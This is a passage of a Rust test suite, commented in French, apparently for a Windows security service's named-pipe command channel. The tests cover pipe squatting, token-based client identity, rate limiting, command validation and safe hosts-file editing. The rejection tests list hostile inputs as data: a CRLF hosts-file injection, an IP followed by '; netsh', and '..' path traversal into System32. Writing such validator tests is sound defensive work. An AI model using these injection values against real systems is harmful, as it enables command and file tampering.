        let large: Vec<u16> = nom.encode_utf16().chain(Some(0)).collect();
        let tube = unsafe { CreateNamedPipeW(PCWSTR(large.as_ptr()), PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 512, 512, 0, None) };
        assert!(!tube.is_invalid());
        let nom_client = nom.clone();
        let client = std::thread::spawn(move || {
            let mut c = std::fs::OpenOptions::new().read(true).write(true).open(&nom_client).unwrap();
            if let Some(t) = envoi {
                c.write_all(t.as_bytes()).unwrap();
            }
            // Le client garde la connexion ouverte sans rien envoyer de plus
            std::thread::sleep(Duration::from_secs(6));
        });
        let _ = unsafe { ConnectNamedPipe(tube, None) };
        let debut = Instant::now();
        let lu = crate::canal::lire_commande(HANDLE(tube.0), Duration::from_millis(800));
        let duree = debut.elapsed();
        assert!(duree < Duration::from_secs(3), "{essai} : lecture non bornée ({duree:?})");
        match envoi {
            None => assert!(lu.is_empty(), "silence : rien ne doit être lu"),
            Some(t) => assert_eq!(String::from_utf8_lossy(&lu), t, "commande : lue en entier"),
        }
        unsafe { let _ = CloseHandle(tube); }
        client.join().unwrap();
    }
}

/// Lot 5 : canal occupé par un autre processus au démarrage (squat) : le PID de celui qui tient le tube est lu en
/// client anonyme (jamais avec l'identité de SYSTEM), et l'alerte est critique, avec le PID et le chemin
#[test]
fn lot5_canal_squat_pid_et_alerte_critique() {
    use windows::core::PCWSTR;
    use windows::Win32::Foundation::CloseHandle;
    use windows::Win32::Storage::FileSystem::PIPE_ACCESS_DUPLEX;
    use windows::Win32::System::Pipes::{CreateNamedPipeW, PIPE_READMODE_BYTE, PIPE_TYPE_BYTE, PIPE_WAIT};
    let nom = format!(r"\\.\pipe\d4t-essai-lot5-squat-{}", std::process::id());
    let large: Vec<u16> = nom.encode_utf16().chain(Some(0)).collect();
    let tube = unsafe { CreateNamedPipeW(PCWSTR(large.as_ptr()), PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 512, 512, 0, None) };
    assert!(!tube.is_invalid());
    assert_eq!(crate::canal::pid_serveur_anonyme(&nom), Some(std::process::id()));
    unsafe { let _ = CloseHandle(tube); }
    assert_eq!(crate::canal::pid_serveur_anonyme(&nom), None, "tube fermé : aucun PID");
    let a = crate::canal::alerte_squat(Some(4242), r"C:\Users\x\AppData\squat.exe");
    assert_eq!(a.niveau, "Critique");
    assert_eq!(a.pid, Some(4242));
    assert!(a.raisons.contains("4242") && a.raisons.contains(r"C:\Users\x\AppData\squat.exe"), "{}", a.raisons);
    let inconnu = crate::canal::alerte_squat(None, "");
    assert_eq!(inconnu.niveau, "Critique");
    // Revue : alerte de squat seulement quand le nom est déjà pris à la création de la première instance
    use crate::canal::squat;
    assert!(squat(5), "ERROR_ACCESS_DENIED : nom déjà pris");
    assert!(squat(231), "ERROR_PIPE_BUSY : nom pris par un tube à instances limitées");
    assert!(!squat(8), "ERROR_NOT_ENOUGH_MEMORY : autre erreur");
    assert!(!squat(0));
    // Code réellement rendu par Windows quand un autre processus tient déjà le nom, qu'il limite ou non le nombre
    // d'instances : la décision s'appuie sur ce constat
    use windows::Win32::Storage::FileSystem::FILE_FLAG_FIRST_PIPE_INSTANCE;
    for max in [1u32, 255] {
        let nom = format!(r"\\.\pipe\d4t-essai-lot5-pris-{max}-{}", std::process::id());
        let large: Vec<u16> = nom.encode_utf16().chain(Some(0)).collect();
        let tenu = unsafe { CreateNamedPipeW(PCWSTR(large.as_ptr()), PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, max, 512, 512, 0, None) };
        assert!(!tenu.is_invalid());
        let second = unsafe { CreateNamedPipeW(PCWSTR(large.as_ptr()), PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 255, 512, 512, 0, None) };
        let code = (windows::core::Error::from_win32().code().0 as u32) & 0xFFFF;
        assert!(second.is_invalid(), "nom déjà pris : création refusée");
        assert!(squat(code), "instances maximales {max} : code {code}, pas reconnu comme squat");
        unsafe { let _ = CloseHandle(tenu); }
    }
}

// ------------------------------------------------------------ phase 1 : autorisation, validation, débit du canal

fn commande_json(j: &str) -> crate::commun::Commande {
    serde_json::from_str(j).unwrap_or_else(|e| panic!("{j} : {e}"))
}

#[test]
fn phase1_autorisation_par_commande() {
    use crate::validation::{autorisee, Client, ACTIONS};
    for a in ACTIONS {
        assert!(autorisee(a, Client::Systeme) && autorisee(a, Client::Administrateur), "{a} : SYSTEM et administrateurs");
        assert_eq!(autorisee(a, Client::Autre), *a == "verification", "{a} : un client « autre » ne peut que demander la version");
    }
    for inconnue in ["", "Tuer", "tuer ", "panique\n", "toutDebloquer2", "executer"] {
        for c in [Client::Systeme, Client::Administrateur, Client::Autre] {
            assert!(!autorisee(inconnue, c), "action inconnue {inconnue:?} refusée pour {c:?}");
        }
    }
    // Admission : un client « autre » est refusé avant toute validation, sans exécution
    let r = crate::canal::admettre(br#"{"Action":"toutDebloquer"}"#, Client::Autre, true).err().expect("refus");
    assert!(!r.ok && r.message.contains("non autorisée"), "{}", r.message);
    assert!(crate::canal::admettre(br#"{"Action":"verification"}"#, Client::Autre, true).is_ok());
}

#[test]
fn phase1_commandes_de_l_interface_acceptees() {
    // Formes exactes envoyées par l'interface (src/*.cs) : aucune régression
    let sid = "S-1-5-21-1111111111-2222222222-3333333333-1001";
    for j in [
        r#"{"Action":"apprentissage","Valeur":"oublier"}"#.to_string(),
        r#"{"Action":"apprentissage","Valeur":"recommencer"}"#.to_string(),
        r#"{"Action":"apprentissage","Valeur":"terminer"}"#.to_string(),
        format!(r#"{{"Action":"autoriserLecteur","Valeur":"{sid}"}}"#),
        r#"{"Action":"baseline","Valeur":"appliquer","Cible":"recommandé"}"#.to_string(),
        r#"{"Action":"baseline","Valeur":"annuler","Cible":"recommandé,renforcé"}"#.to_string(),
        r#"{"Action":"baseline","Valeur":"evaluer","Cible":""}"#.to_string(),
        r#"{"Action":"bloquer","Ip":"203.0.113.7","NomDns":"exemple.test","Raison":"flux de chrome"}"#.to_string(),
        r#"{"Action":"bloquer","Ip":"2001:db8::7","NomDns":null,"Raison":"flux de x"}"#.to_string(),
        r#"{"Action":"config","Cible":"Ips","Valeur":"true"}"#.to_string(),
        r#"{"Action":"config","Cible":"ReponseAutoRancongiciel","Valeur":"false"}"#.to_string(),
        r#"{"Action":"debloquer","Type":"hosts","Cible":"exemple.test"}"#.to_string(),
        r#"{"Action":"debloquer","Type":"parefeu","Cible":"203.0.113.7"}"#.to_string(),
        r#"{"Action":"debloquer","Type":"programme","Cible":"C:\\Outils\\x.exe"}"#.to_string(),
        r#"{"Action":"exception","Cible":"01db2f1c3a4b5c6d-00001a2b-0003"}"#.to_string(),
        r#"{"Action":"jetonApi"}"#.to_string(), r#"{"Action":"nouveauJeton"}"#.to_string(),
        r#"{"Action":"majConfig","Valeur":"{\"Auto\":false,\"Url\":\"https://exemple.test/m.json\"}"}"#.to_string(),
        r#"{"Action":"majMenaces"}"#.to_string(), r#"{"Action":"majVerifier"}"#.to_string(),
        r#"{"Action":"panique","Valeur":"on"}"#.to_string(), r#"{"Action":"panique","Valeur":"off"}"#.to_string(),
        r#"{"Action":"reglages","Valeur":"{\"Langue\":\"en\",\"Notifications\":null}"}"#.to_string(),
        r#"{"Action":"restaurer","Cible":"01db2f1c3a4b5c6d-00001a2b-0004"}"#.to_string(),
        r#"{"Action":"restaurerRepli","Cible":"01db2f1c3a4b5c6d-00001a2b-0004"}"#.to_string(),
        r#"{"Action":"testerSyslog","Valeur":"{\"Actif\":true}"}"#.to_string(),
        r#"{"Action":"toutDebloquer"}"#.to_string(),
        r#"{"Action":"notifications","Valeur":"{\"Config\":null}"}"#.to_string(),
        r#"{"Action":"testerNotifications","Valeur":"{}"}"#.to_string(),
        r#"{"Action":"tuer","Cible":"4242","Raison":"action manuelle sur x","Chemin":"C:\\P.exe","Creation":133000000000000000}"#.to_string(),
        r#"{"Action":"tuerChaine","Cible":"4242","Raison":"action manuelle sur x","Chemin":"C:\\P.exe","Creation":133000000000000000}"#.to_string(),
        r#"{"Action":"suspendre","Cible":"4242","Chemin":"C:\\P.exe","Creation":133000000000000000}"#.to_string(), r#"{"Action":"reprendre","Cible":"4242","Chemin":"C:\\P.exe","Creation":133000000000000000}"#.to_string(),
        r#"{"Action":"quarantaine","Cible":"C:\\Users\\x\\Downloads\\outil.exe","Raison":"action manuelle sur outil"}"#.to_string(),
        r#"{"Action":"isolerProgramme","Cible":"D:\\Jeux\\jeu.exe","Raison":"action manuelle sur jeu"}"#.to_string(),
        r#"{"Action":"verification"}"#.to_string(),
    ] {
        assert_eq!(crate::validation::valider(&commande_json(&j)), Ok(()), "{j}");
    }
}

#[test]
fn phase1_champs_invalides_refuses() {
    use crate::validation::valider;
    let long = "a".repeat(5000);
    for (j, pourquoi) in [
        (r#"{}"#.to_string(), "action manquante"),
        (r#"{"Action":"inconnue"}"#.to_string(), "action inconnue"),
        (r#"{"Action":"bloquer","NomDns":"exemple.test\r\n203.0.113.9 banque.test"}"#.to_string(), "fin de ligne dans le nom : injection du fichier hosts"),
        (r#"{"Action":"bloquer","NomDns":"évil.test"}"#.to_string(), "nom accentué hors punycode"),
        (r#"{"Action":"bloquer","NomDns":"a..b"}"#.to_string(), "étiquette vide"),
        (r#"{"Action":"bloquer","NomDns":"-a.test"}"#.to_string(), "étiquette commençant par un tiret"),
        (r#"{"Action":"bloquer"}"#.to_string(), "ni nom ni adresse"),
        (r#"{"Action":"bloquer","Ip":"1.2.3"}"#.to_string(), "adresse tronquée"),
        (r#"{"Action":"bloquerIp","Ip":"203.0.113.7 ; netsh"}"#.to_string(), "adresse suivie d'une commande"),
        (r#"{"Action":"debloquer","Type":"autre","Cible":"x"}"#.to_string(), "type inconnu"),
        (r#"{"Action":"debloquer","Type":"parefeu","Cible":"exemple.test"}"#.to_string(), "pare-feu : adresse attendue"),
        (r#"{"Action":"debloquer","Type":"programme","Cible":"x.exe"}"#.to_string(), "chemin relatif"),
        (r#"{"Action":"config","Cible":"Defender","Valeur":"false"}"#.to_string(), "réglage inconnu"),
        (r#"{"Action":"config","Cible":"Ips","Valeur":"oui"}"#.to_string(), "valeur non booléenne"),
        (r#"{"Action":"reglages","Valeur":"pas du json"}"#.to_string(), "objet JSON attendu"),
        (r#"{"Action":"tuer","Cible":"4"}"#.to_string(), "PID de System"),
        (r#"{"Action":"tuer","Cible":"0"}"#.to_string(), "PID nul"),
        (r#"{"Action":"tuer","Cible":"-1"}"#.to_string(), "PID négatif"),
        (r#"{"Action":"quarantaine","Cible":"\\\\serveur\\partage\\x.exe"}"#.to_string(), "chemin réseau"),
        (r#"{"Action":"quarantaine","Cible":"\\\\?\\C:\\x.exe"}"#.to_string(), "chemin d'appareil"),
        (r#"{"Action":"quarantaine","Cible":"C:\\x\u0000.exe"}"#.to_string(), "caractère NUL"),
        (r#"{"Action":"isolerProgramme","Cible":"C:\\x\\..\\Windows\\System32\\svchost.exe"}"#.to_string(), "élément .. (contournement du refus du dossier Windows)"),
        (r#"{"Action":"quarantaine","Cible":"C:\\x\\..\\y.exe"}"#.to_string(), "élément .."),
        (r#"{"Action":"isolerProgramme","Cible":"C:\\.\\Windows\\System32\\cmd.exe"}"#.to_string(), "élément « . »"),
        (r#"{"Action":"isolerProgramme","Cible":"C:\\\\Windows\\System32\\cmd.exe"}"#.to_string(), "élément vide"),
        (r#"{"Action":"isolerProgramme","Cible":"C:\\Windows.\\System32\\cmd.exe"}"#.to_string(), "élément terminé par un point"),
        (r#"{"Action":"isolerProgramme","Cible":"C:\\Windows \\System32\\cmd.exe"}"#.to_string(), "élément terminé par une espace"),
        (r#"{"Action":"quarantaine","Cible":"C:\\x\\a.exe:flux"}"#.to_string(), "flux de données"),
        (r#"{"Action":"quarantaine","Cible":"C:\\x\\"}"#.to_string(), "dossier, pas un fichier"),
        (r#"{"Action":"isolerProgramme","Cible":"programme.exe"}"#.to_string(), "chemin relatif"),
        (r#"{"Action":"restaurer","Cible":"../../x"}"#.to_string(), "identifiant avec séparateurs"),
        (r#"{"Action":"panique","Valeur":"peut-être"}"#.to_string(), "valeur de panique"),
        (r#"{"Action":"baseline","Valeur":"supprimer","Cible":"recommandé"}"#.to_string(), "opération de baseline inconnue"),
        (r#"{"Action":"baseline","Valeur":"appliquer","Cible":"recommandé;x"}"#.to_string(), "sélection de baseline invalide"),
        (r#"{"Action":"apprentissage","Valeur":"tout"}"#.to_string(), "apprentissage inconnu"),
        (r#"{"Action":"autoriserLecteur","Valeur":"Administrateurs"}"#.to_string(), "SID attendu"),
        (format!(r#"{{"Action":"quarantaine","Cible":"C:\\{long}"}}"#), "cible trop longue"),
        (format!(r#"{{"Action":"reglages","Valeur":"{{{}}}"}}"#, "a".repeat(40000)), "valeur trop longue"),
        (r#"{"Action":"reglages","Valeur":"{\u0007}"}"#.to_string(), "caractère de contrôle dans la valeur"),
    ] {
        assert!(valider(&commande_json(&j)).is_err(), "{pourquoi} : devait être refusé ({})", j.chars().take(120).collect::<String>());
    }
    // Raison : normalisée, jamais une cause de refus (un programme nommé avec une fin de ligne reste blocable)
    let mut c = commande_json(r#"{"Action":"tuer","Cible":"4242","Raison":"action manuelle sur x\r\nfaux","Chemin":"C:\\P.exe","Creation":133000000000000000}"#);
    crate::validation::normaliser(&mut c);
    assert_eq!(c.raison.as_deref(), Some("action manuelle sur x  faux"));
    assert_eq!(valider(&c), Ok(()));
    let mut l = commande_json(&format!(r#"{{"Action":"verification","Raison":"{}"}}"#, "r".repeat(2000)));
    crate::validation::normaliser(&mut l);
    assert_eq!(l.raison.unwrap().chars().count(), crate::validation::MAX_RAISON);
}

#[test]
fn phase1_fichier_hosts_sans_injection() {
    let noms = vec!["Exemple.Test.".to_string(), "a.test\r\n203.0.113.9 banque.test".to_string(), "évil.test".to_string(), "b.test".to_string()];
    assert_eq!(crate::blocage::lignes_du_bloc(&noms), vec!["exemple.test", "b.test"], "noms invalides écartés, valides en minuscules");
}

/// Audit SEC-005, SEC-006, AUD5-05, AUD5-06 : le fichier hosts était entièrement décodé et filtré en ASCII (lignes
/// de l'utilisateur altérées), un début de bloc sans fin faisait perdre la suite, et l'écriture n'était pas atomique.
/// Les lignes hors du bloc sont maintenant recopiées octet pour octet.
#[test]
fn audit_fichier_hosts_lignes_de_l_utilisateur_intactes() {
    use crate::blocage::{nouveau_contenu, DEBUT_BLOC, FIN_BLOC};
    let d = |v: &[&str]| v.iter().map(|x| x.to_string()).collect::<Vec<_>>();
    let utilisateur = "# serveur du café, étage 2\r\n192.168.1.20\tnas.local\r\n".as_bytes();
    // Sans bloc ni domaine : contenu identique, octet pour octet (y compris sans fin de ligne finale)
    assert_eq!(nouveau_contenu(utilisateur, &[]).unwrap(), utilisateur);
    assert_eq!(nouveau_contenu(b"10.0.0.1 a", &[]).unwrap(), b"10.0.0.1 a");
    // Bloc ajouté : lignes de l'utilisateur intactes devant
    let n = nouveau_contenu(utilisateur, &d(&["Exemple.Test"])).unwrap();
    assert!(n.starts_with(utilisateur));
    assert_eq!(&n[utilisateur.len()..], format!("{DEBUT_BLOC}\r\n127.0.0.1\texemple.test\r\n{FIN_BLOC}\r\n").as_bytes());
    // Bloc existant remplacé, lignes avant et après gardées telles quelles
    let avec = [utilisateur, format!("{DEBUT_BLOC}\r\n127.0.0.1\tancien.test\r\n{FIN_BLOC}\r\n").as_bytes(), "# après, déjà là\r\n".as_bytes()].concat();
    let n = nouveau_contenu(&avec, &d(&["b.test"])).unwrap();
    let t = String::from_utf8(n).unwrap();
    assert!(t.starts_with("# serveur du café, étage 2\r\n192.168.1.20\tnas.local\r\n# après, déjà là\r\n"), "{t:?}");
    assert!(t.contains("127.0.0.1\tb.test") && !t.contains("ancien.test"));
    // Bloc retiré quand il n'y a plus de domaine
    assert_eq!(nouveau_contenu(&avec, &[]).unwrap(), [utilisateur, "# après, déjà là\r\n".as_bytes()].concat());
    // Faux début de bloc sans fin : ligne de l'utilisateur, rien n'est perdu après
    let faux = [utilisateur, format!("{DEBUT_BLOC}\r\n10.6.6.6 banque.test\r\n").as_bytes()].concat();
    let n = nouveau_contenu(&faux, &d(&["c.test"])).unwrap();
    assert!(n.starts_with(&faux), "le faux début de bloc et la ligne suivante sont gardés");
    // Écritures successives (relecture de #54) : faux début AVANT le vrai bloc ; la seconde écriture ne doit rien
    // perdre de l'utilisateur, et une écriture répétée avec les mêmes domaines ne change rien (idempotence)
    let faux_avant = format!("# u\r\n{DEBUT_BLOC}\r\n10.0.0.9 nas.test\r\n# ligne de l'utilisateur\r\n").into_bytes();
    let un = nouveau_contenu(&faux_avant, &d(&["c.test"])).unwrap();
    assert!(un.starts_with(&faux_avant));
    let deux = nouveau_contenu(&un, &d(&["d.test"])).unwrap();
    let t = String::from_utf8(deux.clone()).unwrap();
    assert!(t.starts_with(std::str::from_utf8(&faux_avant).unwrap()), "seconde écriture : lignes de l'utilisateur perdues : {t:?}");
    assert!(t.contains("127.0.0.1\td.test") && !t.contains("c.test"), "{t:?}");
    assert_eq!(nouveau_contenu(&deux, &d(&["d.test"])).unwrap(), deux, "même domaines : contenu inchangé");
    assert_eq!(nouveau_contenu(&deux, &[]).unwrap(), faux_avant, "bloc retiré : exactement les lignes de l'utilisateur");
    // Deux blocs complets (fichier laissé ainsi par une version ancienne, ou édité à la main) : tous retirés, idempotent
    let deux = format!("# u\r\n{DEBUT_BLOC}\r\n127.0.0.1\ta.test\r\n{FIN_BLOC}\r\n# v\r\n{DEBUT_BLOC}\r\n127.0.0.1\tb.test\r\n{FIN_BLOC}\r\n# w\r\n").into_bytes();
    assert_eq!(nouveau_contenu(&deux, &[]).unwrap(), b"# u\r\n# v\r\n# w\r\n", "retrait complet : aucun bloc ne reste");
    let un = nouveau_contenu(&deux, &d(&["c.test"])).unwrap();
    let t = String::from_utf8(un.clone()).unwrap();
    assert_eq!(t.matches(DEBUT_BLOC).count(), 1, "{t:?}");
    assert!(!t.contains("a.test") && !t.contains("b.test") && t.contains("c.test"), "{t:?}");
    assert_eq!(nouveau_contenu(&un, &d(&["c.test"])).unwrap(), un, "idempotent après fusion des blocs");
    let (hors, bloc) = crate::blocage::decouper_hosts(&deux);
    assert_eq!(hors, ["# u", "# v", "# w"]);
    assert_eq!(bloc, ["a.test", "b.test"]);
    // Fin sans début avant le bloc : ligne de l'utilisateur, gardée
    let fin_seule = format!("{FIN_BLOC}\r\n# u\r\n").into_bytes();
    let n = nouveau_contenu(&fin_seule, &d(&["e.test"])).unwrap();
    assert!(n.starts_with(&fin_seule) && nouveau_contenu(&n, &[]).unwrap() == fin_seule);
    // Bloc en fin de fichier sans fin de ligne finale : jamais « \r\r\n », ni ligne laissée sans sa fin de ligne
    let sans_fin = format!("# u\r\n{DEBUT_BLOC}\r\n127.0.0.1\tf.test\r\n{FIN_BLOC}").into_bytes();
    let n = nouveau_contenu(&sans_fin, &d(&["g.test"])).unwrap();
    assert!(!n.windows(3).any(|w| w == b"\r\r\n") && n.starts_with(b"# u\r\n"), "{:?}", String::from_utf8_lossy(&n));
    assert_eq!(nouveau_contenu(&sans_fin, &[]).unwrap(), b"# u\r\n");
    // UTF-16 : refusé plutôt que cassé
    assert!(nouveau_contenu(&[0xFF, 0xFE, b'#', 0], &d(&["a.test"])).is_err());
}

#[test]
fn phase1_messages_malformes_tronques() {
    use crate::validation::Client;
    // Lecture : vide, BOM, seconde ligne ignorée, non UTF-8
    assert!(crate::validation::decoder_commande(b"").is_err());
    assert!(crate::validation::decoder_commande(b"   \r\n").is_err());
    assert_eq!(crate::validation::decoder_commande("\u{feff}{\"Action\":\"verification\"}\r\n{\"Action\":\"toutDebloquer\"}".as_bytes()).unwrap().action.as_deref(), Some("verification"));
    assert!(crate::validation::decoder_commande(&[0xff, 0xfe, 0x00, 0x7b]).is_err());
    // Toutes les troncatures et des milliers de variantes corrompues : jamais de panique ; une commande admise est
    // toujours une commande valide
    for valide in [
        br#"{"Action":"bloquer","Ip":"203.0.113.7","NomDns":"exemple.test","Raison":"flux de x"}"#.as_slice(),
        br#"{"Action":"quarantaine","Cible":"C:\\Users\\x\\a.exe","Raison":"r"}"#.as_slice(),
        br#"{"Action":"reglages","Valeur":"{\"Langue\":\"en\"}"}"#.as_slice(),
    ] {
        torturer(valide, &mut |o| {
            if let Ok(c) = crate::canal::admettre(o, Client::Administrateur, true) {
                assert_eq!(crate::validation::valider(&c), Ok(()));
            }
        });
    }
    // Débit dépassé : refus avant lecture, même pour une commande valide
    let r = crate::canal::admettre(br#"{"Action":"verification"}"#, Client::Administrateur, false).err().expect("refus");
    assert!(r.message.contains("Trop de commandes"), "{}", r.message);
}

#[test]
fn phase1_debit_du_canal() {
    use std::time::{Duration, Instant};
    let mut d = crate::validation::Debit::new(3, Duration::from_secs(10));
    let t = Instant::now();
    assert!(d.accepter(t) && d.accepter(t + Duration::from_secs(1)) && d.accepter(t + Duration::from_secs(2)));
    assert!(!d.accepter(t + Duration::from_secs(3)), "quatrième commande dans la fenêtre : refusée");
    assert!(!d.accepter(t + Duration::from_secs(9)), "un refus ne compte pas, mais la fenêtre est encore pleine");
    assert!(d.accepter(t + Duration::from_secs(10)), "la première est sortie de la fenêtre");
    assert!(!d.accepter(t + Duration::from_secs(10)));
}

/// Identité lue sur le jeton de la CONNEXION, après la lecture de la commande (durcissement du canal) : client au
/// niveau Identification (celui de l'interface et du script de mise à jour) identifié, même sans avoir rien écrit
/// (constaté : le jeton est celui de la connexion ; une commande vide est de toute façon refusée) ; client Anonymous :
/// « autre » (échec fermé)
#[test]
fn phase1_client_du_tube_identifie_sur_son_jeton() {
    use std::io::Write;
    use std::os::windows::fs::OpenOptionsExt;
    use windows::core::PCWSTR;
    use windows::Win32::Foundation::{CloseHandle, HANDLE};
    use windows::Win32::Storage::FileSystem::{ReadFile, PIPE_ACCESS_DUPLEX, SECURITY_ANONYMOUS, SECURITY_IDENTIFICATION};
    use windows::Win32::System::Pipes::{ConnectNamedPipe, CreateNamedPipeW, PIPE_READMODE_BYTE, PIPE_TYPE_BYTE, PIPE_WAIT};
    // Le client est ce processus de test : comparé à un calcul indépendant (IsUserAnAdmin : administrateur élevé).
    // Tests lancés élevés : le cas « administrateur » est exercé ; sinon « autre » (et le passage VM, en
    // administrateur, exerce le cas élevé avec le service réel)
    let attendu = if crate::natif::est_systeme() {
        crate::validation::Client::Systeme
    } else if unsafe { windows::Win32::UI::Shell::IsUserAnAdmin() }.as_bool() {
        crate::validation::Client::Administrateur
    } else {
        crate::validation::Client::Autre
    };
    for (essai, niveau, ecrit, voulu) in [
        ("identification", SECURITY_IDENTIFICATION.0, true, attendu),
        ("anonyme", SECURITY_ANONYMOUS.0, true, crate::validation::Client::Autre),
        ("rien écrit", SECURITY_IDENTIFICATION.0, false, attendu),
    ] {
        let nom = format!(r"\\.\pipe\d4t-essai-phase1-client-{}-{}", std::process::id(), essai.len());
        let large: Vec<u16> = nom.encode_utf16().chain(Some(0)).collect();
        let tube = unsafe { CreateNamedPipeW(PCWSTR(large.as_ptr()), PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 512, 512, 0, None) };
        assert!(!tube.is_invalid());
        let n = nom.clone();
        let client = std::thread::spawn(move || {
            let mut c = std::fs::OpenOptions::new().read(true).write(true).security_qos_flags(niveau).open(&n).unwrap();
            if ecrit {
                c.write_all(b"x").unwrap();
            }
            std::thread::sleep(std::time::Duration::from_millis(500));
        });
        let _ = unsafe { ConnectNamedPipe(tube, None) };
        if ecrit {
            let mut b = [0u8; 1];
            let mut lus = 0u32;
            assert!(unsafe { ReadFile(tube, Some(&mut b), Some(&mut lus), None) }.is_ok() && lus == 1, "{essai} : lecture");
        }
        let (vu, sid) = crate::natif::identite_client_tube(HANDLE(tube.0));
        assert_eq!(vu, voulu, "{essai} : client du tube mal identifié");
        assert_eq!(sid.is_empty(), essai == "anonyme", "{essai} : SID lu seulement sur un jeton");
        client.join().unwrap();
        unsafe { let _ = CloseHandle(tube); }
    }
    // Handle invalide : « autre » (échec fermé)
    assert_eq!(crate::natif::client_tube(windows::Win32::Foundation::INVALID_HANDLE_VALUE), crate::validation::Client::Autre);
}

/// Durcissement du canal, IPC-04 : la réponse est écrite en un délai borné ; un client qui ne la lit jamais (réponse
/// plus grande que le tampon du tube : l'écriture elle-même bloquerait) ne bloque pas le canal, un client qui la lit
/// la reçoit en entier
#[test]
fn canal_reponse_bornee_client_qui_ne_lit_pas() {
    use std::io::Read;
    use std::time::{Duration, Instant};
    use windows::core::PCWSTR;
    use windows::Win32::Foundation::{CloseHandle, HANDLE};
    use windows::Win32::Storage::FileSystem::PIPE_ACCESS_DUPLEX;
    use windows::Win32::System::Pipes::{ConnectNamedPipe, CreateNamedPipeW, PIPE_READMODE_BYTE, PIPE_TYPE_BYTE, PIPE_WAIT};
    for (essai, taille, lit) in [("muet, petite réponse", 100usize, false), ("muet, grande réponse", 4000, false), ("lecteur", 4000, true)] {
        let nom = format!(r"\\.\pipe\d4t-essai-ipc04-{}-{}-{}", std::process::id(), taille, lit);
        let large: Vec<u16> = nom.encode_utf16().chain(Some(0)).collect();
        let tube = unsafe { CreateNamedPipeW(PCWSTR(large.as_ptr()), PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 512, 512, 0, None) };
        assert!(!tube.is_invalid());
        let n = nom.clone();
        let client = std::thread::spawn(move || {
            let mut c = std::fs::OpenOptions::new().read(true).write(true).open(&n).unwrap();
            let mut recu = Vec::new();
            if lit {
                let mut b = [0u8; 1024];
                while !recu.ends_with(b"\n") {
                    let k = c.read(&mut b).unwrap();
                    assert!(k > 0);
                    recu.extend_from_slice(&b[..k]);
                }
            }
            // Le client garde la connexion ouverte, sans (plus) rien lire
            std::thread::sleep(Duration::from_secs(4));
            recu.len()
        });
        let _ = unsafe { ConnectNamedPipe(tube, None) };
        let mut sortie = vec![b'a'; taille - 2];
        sortie.extend_from_slice(b"\r\n");
        let debut = Instant::now();
        let ok = crate::canal::ecrire_reponse(HANDLE(tube.0), &sortie, Duration::from_millis(800));
        let duree = debut.elapsed();
        assert!(duree < Duration::from_secs(3), "{essai} : écriture non bornée ({duree:?})");
        assert_eq!(ok, lit, "{essai} : réponse lue ?");
        unsafe { let _ = CloseHandle(tube); }
        let recu = client.join().unwrap();
        assert_eq!(recu, if lit { taille } else { 0 }, "{essai} : réponse reçue en entier");
    }
}

/// Durcissement du canal (relecture indépendante, accord du mainteneur) : câblage. Clients distants refusés par le tube ;
/// identité lue sur le jeton de la connexion, après la lecture, jamais plus sur le PID ; réponse écrite en un délai
/// borné ; clients du service (interface, script de mise à jour) au niveau Identification, avec lecture bornée côté
/// interface
#[test]
fn canal_durcissement_cablage() {
    let canal = include_str!("canal.rs").replace("\r\n", "\n");
    assert!(canal.contains("PIPE_WAIT | PIPE_REJECT_REMOTE_CLIENTS,"), "clients distants refusés");
    let t = &canal[canal.find("fn traiter(").unwrap()..];
    assert!(t.find("lire_commande(tube, DELAI_LECTURE)").unwrap() < t.find("identite_client_tube(tube)").unwrap(), "identité lue après la commande");
    assert!(t.contains("ecrire_reponse(tube, &sortie, DELAI_ECRITURE) && debut.elapsed() >= DELAI_ECRITURE") && !t.contains("FlushFileBuffers"), "réponse bornée, journal à l'échéance seulement (S168-01)");
    let g = &canal[canal.find("pub fn avec_echeance").unwrap()..canal.find("pub fn lire_commande").unwrap()];
    assert!(g.contains("std::thread::Builder::new()") && !g.contains("std::thread::spawn("), "fil de garde sans panique (R1)");
    let n = include_str!("natif.rs");
    let f = &n[n.find("pub fn identite_client_tube(").unwrap()..];
    let f = &f[..f.find("fn identite_jeton(").unwrap()];
    assert!(f.contains("ImpersonateNamedPipeClient(tube)") && f.contains("OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, true"), "jeton de la connexion");
    assert!(f.contains("retour_ou_arret(RevertToSelf()"), "retour à soi vérifié");
    assert!(!n.contains("GetNamedPipeClientProcessId"), "plus d'identification par le PID");
    assert!(include_str!("maj.rs").contains("[IO.Pipes.PipeOptions]::None, [Security.Principal.TokenImpersonationLevel]::Identification)"), "script de mise à jour");
    let gui = include_str!("../../src/Gui.cs");
    assert!(gui.contains("PipeOptions.None, TokenImpersonationLevel.Identification)"), "interface au niveau Identification");
    assert!(gui.contains("DELAI_REPONSE"), "lecture bornée côté interface");
}

/// Serveur de tube de test : accepte un client, lit une ligne, répond `reponse` ; renvoie la ligne reçue
fn serveur_tube(nom: &str, reponse: &'static str) -> std::thread::JoinHandle<String> {
    use windows::core::PCWSTR;
    use windows::Win32::Foundation::{CloseHandle, HANDLE};
    use windows::Win32::Storage::FileSystem::{FlushFileBuffers, ReadFile, WriteFile, PIPE_ACCESS_DUPLEX};
    use windows::Win32::System::Pipes::{ConnectNamedPipe, CreateNamedPipeW, PIPE_READMODE_BYTE, PIPE_TYPE_BYTE, PIPE_WAIT};
    let chemin: Vec<u16> = format!(r"\\.\pipe\{nom}").encode_utf16().chain(Some(0)).collect();
    let tube = unsafe { CreateNamedPipeW(PCWSTR(chemin.as_ptr()), PIPE_ACCESS_DUPLEX, PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT, 1, 512, 512, 0, None) };
    assert!(!tube.is_invalid());
    let brut = tube.0 as usize;
    std::thread::spawn(move || unsafe {
        let h = HANDLE(brut as _);
        let _ = ConnectNamedPipe(h, None);
        let mut recu = Vec::new();
        let mut octet = [0u8; 1];
